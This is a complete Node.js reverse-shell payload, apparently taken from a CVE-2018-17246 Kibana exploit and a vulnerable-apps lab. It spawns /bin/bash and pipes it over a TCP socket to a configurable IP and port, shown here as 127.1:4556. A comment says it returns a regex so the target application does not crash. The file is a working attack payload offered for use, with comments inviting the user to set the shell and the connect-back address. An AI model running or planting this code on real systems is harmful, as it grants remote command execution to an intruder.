// creds: https://github.com/mpgn/CVE-2018-17246/blob/3d866d5321b63185592d1abd01b5cdea550f6c76/README.md
// https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
(function(){
    var net = require("net"),
        cp = require("child_process"),
        // config shell here
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    // config ip/port here
    client.connect(4556, "127.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
